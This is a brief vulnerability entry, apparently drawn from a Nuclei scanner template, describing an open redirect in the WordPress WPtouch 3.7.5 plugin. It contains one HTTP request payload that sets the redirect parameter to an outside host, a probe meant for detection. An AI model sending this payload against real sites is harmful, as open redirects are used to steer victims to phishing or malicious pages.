# Vulnerability: WordPress WPtouch 3.7.5 - Open Redirect
**Classification:** WP-PLUGIN
**Source:** Nuclei Template (`wp-touch-redirect.yaml`)

## Description
WordPress WPtouch 3.7.5 is affected by an Open Redirect issue.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?wptouch_switch=desktop&redirect=http://interact.sh
```

